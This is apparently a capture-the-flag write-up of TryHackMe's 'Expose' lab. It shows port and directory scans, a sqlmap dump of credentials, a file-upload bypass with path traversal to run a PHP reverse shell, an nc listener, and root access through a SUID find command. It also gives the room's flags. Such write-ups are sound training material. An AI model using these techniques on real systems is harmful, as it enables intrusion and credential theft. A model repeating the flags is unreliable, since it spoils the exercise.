<h1 align="center">Expose</h1>
<p align="center"> <img width="160px" src="https://github.com/user-attachments/assets/4f58f330-acaf-469d-9d2f-1c4822e39fa2"><br>
Jun 6, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure,<br>
part of my 396-day-streak in  <a href="https://tryhackme.com">TryHackMe</a><br>
Use your red teaming knowledge to pwn a Linux machine. <a href="https://tryhackme.com/room/expose"</a>here.<br><br>
<img width="1000px" src="https://github.com/user-attachments/assets/1d80c2c0-8e8f-42cf-93a7-4dd0490573b1"></p>

<br>

<h2>Task 1 . Expose</h2>

<p>This challenge is an initial test to evaluate your capabilities in red teaming skills. Start the VM by clicking the Start Machine button at the top right of the task. You will find all the necessary tools to complete the challenge, like Nmap, sqlmap, wordlists, PHP shell, and many more in the AttackBox.<br><br>

Exposing unnecessary services in a machine can be dangerous. Can you capture the flags and pwn the machine?</p>

<h3 align="left">Answer the question below</h3>

> 1.1. <em>What is the user flag?</em><br><a id='1.1'></a>
>> <strong><code>THM{USER_FLAG_1231_EXPOSE}</code></strong><br>

> 1.2. <em>What is the root flag?</em><br><a id='1.2'></a>
>> <strong><code>THM{ROOT_EXPOSED_1001}</code></strong><br>

<h3>nmap</h3>

```bash
:~# nmap -sS -p- 10.10.41.181
...
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
53/tcp   open  domain
1337/tcp open  waste
1883/tcp open  mqtt
...
```

<br>

```bash
:~# nmap -sV -p 21,22,53,1337,1883 10.10.41.181
...
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
1883/tcp open  mqtt
...
```

<h3>ffuf</h3>

```bash
:~# ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.41.181:1337/FUZZ
...
admin                   [Status: 301, Size: 319, Words: 20, Lines: 10]
...
phpmyadmin              [Status: 301, Size: 324, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10]
:: Progress: [218275/218275] :: Job [1/1] :: 19722 req/sec :: Duration: [0:00:26] :: Errors: 0 ::
```

<h3>hhtp://TargetIP:1337/admin</h3>

![image](https://github.com/user-attachments/assets/cf4fa0ec-b942-4d96-9677-bebc610211a1)

<h3>hhtp://TargetIP:1337/phpmyadmin</h3>

![image](https://github.com/user-attachments/assets/6019b684-71ff-451b-9152-df09183a5da2)

<h3>hhtp://TargetIP:1337/server-status</h3>

![image](https://github.com/user-attachments/assets/0453a86a-8932-4fa5-8fe0-82a4a0f750a3)

```bash
:~# ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.10.41.181:1337/FUZZ
...
.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10]
admin                   [Status: 301, Size: 319, Words: 20, Lines: 10]
admin_101               [Status: 301, Size: 323, Words: 20, Lines: 10]
javascript              [Status: 301, Size: 324, Words: 20, Lines: 10]
phpmyadmin              [Status: 301, Size: 324, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10]
:: Progress: [20469/20469] :: Job [1/1] :: 196 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

<h3>hhtp://TargetIP:1337/admin_101</h3>
<p>hacker@root.thm</p>

![image](https://github.com/user-attachments/assets/eeb9133b-658f-44f8-a3b4-63caf714a0cb)

<p>There is PHPSESSID and phpMyAdmin cookies.</p>

![image](https://github.com/user-attachments/assets/af9edebd-6a7b-432e-aff9-388172acd780)


<h3>hhtp://TargetIP:1337/javascript</h3>

![image](https://github.com/user-attachments/assets/ba709b6a-29f8-45df-a1a8-b0ae6fabc4ee)


```bash
:~# ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.10.41.181:1337/FUZZ
...
.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10]
admin                   [Status: 301, Size: 319, Words: 20, Lines: 10]
admin_101               [Status: 301, Size: 323, Words: 20, Lines: 10]
javascript              [Status: 301, Size: 324, Words: 20, Lines: 10]
phpmyadmin              [Status: 301, Size: 324, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10]
:: Progress: [20469/20469] :: Job [1/1] :: 196 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```


```bash
:~# dirb http://10.10.41.181:1337/admin_101 -r

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Jun  6 22:13:09 2025
URL_BASE: http://10.10.41.181:1337/admin_101/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Recursive

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.41.181:1337/admin_101/ ----
==> DIRECTORY: http://10.10.41.181:1337/admin_101/assets/                                                                                                     
==> DIRECTORY: http://10.10.41.181:1337/admin_101/includes/                                                                                                   
+ http://10.10.41.181:1337/admin_101/index.php (CODE:200|SIZE:2070)                                                                                           
==> DIRECTORY: http://10.10.41.181:1337/admin_101/modules/                                                                                                    
==> DIRECTORY: http://10.10.41.181:1337/admin_101/test/                                                                                                       
                                                                                                                                                              
-----------------
END_TIME: Fri Jun  6 22:13:12 2025
DOWNLOADED: 4612 - FOUND: 1
```


<h3>gobuster</h3>

![image](https://github.com/user-attachments/assets/e7e9aa9b-e788-4eb8-ba8c-223399d9a269)

```bash
:~# gobuster dir -u http://10.10.41.181:1337/admin_101/includes/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 100
...
/.php                 (Status: 403) [Size: 279]
/functions.php        (Status: 200) [Size: 0]
/user_login.php       (Status: 200) [Size: 0]
/user_signup.php      (Status: 200) [Size: 0]
...
```


![image](https://github.com/user-attachments/assets/bb811f0f-8de9-4318-9112-8a3a592a31f0)

![image](https://github.com/user-attachments/assets/042b2b5d-58c1-4018-b871-e55e152c93e8)

<p><code>"SELECT * FROM user WHERE email = 'hacker@root.thm'"</code></p>

![image](https://github.com/user-attachments/assets/ef165859-7622-438f-b765-46baa6a5e7d6)

<p>Saved item as <code>resquest</code>.</p>

![image](https://github.com/user-attachments/assets/17219395-02aa-4bd4-80f6-6a23ea36a5eb)

<h3>sqlmap</h3>

```bash
~# sqlmap -r request --dump
```

<p>/file1010111/index.php    1  69c66901194a6486176e81f5945b8929 (easytohack)<br
/upload-cv00101011/index.php  3   // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z<br>
retrieved: 'VeryDifficultPassword!!#@#@!#!@#1231'<br>
1    | hacker@root.thm | 2023-02-21 09:05:46 | VeryDifficultPassword!!#@#@!#!@#1231 <br>
table 'expose.`user`' dumped to CSV file '/root/.sqlmap/output/10.10.41.181/dump/expose/user.csv'<br>
fetched data logged to text files under '/root/.sqlmap/output/10.10.41.181</p>

![image](https://github.com/user-attachments/assets/d70cd865-7199-4d23-9f1d-1e5c0c4a8494)

![image](https://github.com/user-attachments/assets/aeca0730-0bd2-45bc-b52c-2cead580f4da)

![image](https://github.com/user-attachments/assets/aea6b869-736f-4c5b-b0e3-1eac94d9bd7e)


<h3>http://TargetIP:1337/file1010111/index.php</h3>

![image](https://github.com/user-attachments/assets/4fdcce84-2c44-41f2-91ee-5656bf6b021e)

![image](https://github.com/user-attachments/assets/d4df459d-70d6-4238-810a-da1638d9c74e)


<h3>http://TargetIP:1337/upload-cv00101011/index.php</h3>

![image](https://github.com/user-attachments/assets/fdaec5ad-e2a5-4cc9-90d1-97246f7389e3)

<h3>http://TargetIP:1337/file1010111/index.php</h3>

![image](https://github.com/user-attachments/assets/35050751-f3ab-4325-8e1a-65e51812931a)

<p>zeamkish</p>

![image](https://github.com/user-attachments/assets/32574eee-e01f-4c1c-915c-a0f93a7fa971)

<h3>http://TargetIP:1337/upload-cv00101011/index.php</h3>

![image](https://github.com/user-attachments/assets/2c07c8c2-a524-45fa-9a17-c24393ee4bfc)

![image](https://github.com/user-attachments/assets/6d3e7723-50d3-4d4d-aedc-9ae168336fc2)

<p><code>.jpg</code> or <code>.png</code></p>

![image](https://github.com/user-attachments/assets/ffe6cdf6-aa8f-4553-9324-68cf8757e4b7)

![image](https://github.com/user-attachments/assets/8256161d-d968-42ae-a870-8d080b04cad8)

![image](https://github.com/user-attachments/assets/b38d1593-7421-45ff-ac4e-66b233941a86)

<h3>Reverse Shell</h3>

https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php

<h3>Listener</h3>

```bash
:~# nc -nlvp 4444
Listening on 0.0.0.0 4444
```

<h3>Browse and upload</h3>

![image](https://github.com/user-attachments/assets/aa5a9aa5-f58d-4139-9845-4379a4e4370e)

![image](https://github.com/user-attachments/assets/131791bd-03ae-4a08-a2ef-50e02d0e73fe)

![image](https://github.com/user-attachments/assets/2918a054-4cb4-4b87-956d-cf105c66dc46)


<h3>http://10.10.41.181:1337/upload-cv00101011//upload_thm_1001/rev.php.jpg</h3>

![image](https://github.com/user-attachments/assets/4a356171-2b7e-4ab6-bd6c-389aad3a410a)

<h3>http://10.10.41.181:1337/file1010111/index.php?file=../upload-cv00101011/upload_thm_1001/rev.php.png</h3>

![image](https://github.com/user-attachments/assets/ba99d185-85ad-482b-99c3-1b2a6eca6253)

<h3>Shell</h3>

```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ pwd
/
$ cd /home/zeamkish
$ ls
flag.txt
ssh_creds.txt
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@ip-10-10-41-181:/home/zeamkish$ ^Z
[1]+  Stopped                 nc -nlvp 4444
:~# stty raw -echo; fg
nc -nlvp 4444
www-data@ip-10-10-41-181:/home/zeamkish$ cat flag.txt
cat: flag.txt: Permission denied
www-data@ip-10-10-41-181:/home/zeamkish$ cat ssh_creds.txt
SSH CREDS
zeamkish
easytohack@123
www-data@ip-10-10-41-181:/home/zeamkish$
```

<h3>zeamlish</h3>

```bash
www-data@ip-10-10-41-181:/home/zeamkish$ su zeamkish
Password: 
zeamkish@ip-10-10-41-181:~$ pwd           
/home/zeamkish
zeamkish@ip-10-10-41-181:~$ cat flag.txt
THM{USER_FLAG_1231_EXPOSE}
zeamkish@ip-10-10-41-181:~$ 
```


```bash
zeamkish@ip-10-10-41-181:~$ find / -perm -4000 2>/dev/null
/snap/core20/1974/usr/bin/chfn
/snap/core20/1974/usr/bin/chsh
/snap/core20/1974/usr/bin/gpasswd
/snap/core20/1974/usr/bin/mount
/snap/core20/1974/usr/bin/newgrp
/snap/core20/1974/usr/bin/passwd
/snap/core20/1974/usr/bin/su
/snap/core20/1974/usr/bin/sudo
/snap/core20/1974/usr/bin/umount
/snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1974/usr/lib/openssh/ssh-keysign
/snap/core20/1950/usr/bin/chfn
/snap/core20/1950/usr/bin/chsh
/snap/core20/1950/usr/bin/gpasswd
/snap/core20/1950/usr/bin/mount
...
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/umount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/nano
/usr/bin/su
/usr/bin/fusermount
/usr/bin/find
/usr/bin/at
/usr/bin/mount
zeamkish@ip-10-10-41-181:~$ 
```


```bash
zeamkish@ip-10-10-41-181:~$ find . -exec /bin/sh -p \; -quit
# whoami
root
# cd /root
# ls
flag.txt  snap
# cat flag.txt
THM{ROOT_EXPOSED_1001}
```


<br>
<br>

<h1 align="center">Room Completed</h1>
<p align="center"> <img width="1000px" src="https://github.com/user-attachments/assets/17bed83c-0760-4f0c-95f2-31e860569009"><br>
<p align="center"> <img width="1000px" src="https://github.com/user-attachments/assets/bedeaea0-73a7-44cc-a7f9-de63a903fd8d"></p>
                   
<h1 align="center">My TryHackMe Journey</h1>

<div align="center">

| Date<br>          |  Streak<br>|   All Time<br>Global   |   All Time<br>Brazil |  Monthly<br>Global   |  Monthly<br>Brazil   |  SHOGUN<br>points  |   Rooms<br>completed  |  Badges<br> |
| :---------------: | :--------: | :--------------------: | :------------------: | :------------------: | :------------------: | :----------------: | :-------------------: | :---------: |
| Jun 6, 2025       |     396    |          201ˢᵗ         |            4ᵗʰ       |        1,867ᵗʰ       |         28ᵗʰ         |       106,483      |             767      |    62       |

</div>

<p align="center"> Global All Time: 201ˢᵗ <br><img width="300px" src="https://github.com/user-attachments/assets/146a42a8-8310-4c14-8534-f7edb6023c1e" alt="Your Image Badge"><br>
                                              <img width="1000px" src="https://github.com/user-attachments/assets/ddaaf108-0bb7-462e-bfa8-a99aff2bb20e"><br><br>
                   Brazil All Time:   4ᵗʰ<br><img width="1000px" src="https://github.com/user-attachments/assets/4fedd347-f3fb-49f8-b0df-f60f7919bc01"><br><br>
                   Global monthly: 1,867ᵗʰ<br><img width="1000px" src="https://github.com/user-attachments/assets/946fb29e-fc32-4a46-b5d5-5cf74ef49153"><br><br>
                   Brazil monthly:   28ᵗʰ<br><img width="1000px" src="https://github.com/user-attachments/assets/8a342433-9f52-4ccb-b168-cee33c5a342c"><br><br></p>

<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 
<br><br>
<h1 align="center">Thank you very much tryhackme and 1337rce for developinng this experience so that I could sharpen my skills!</h1>
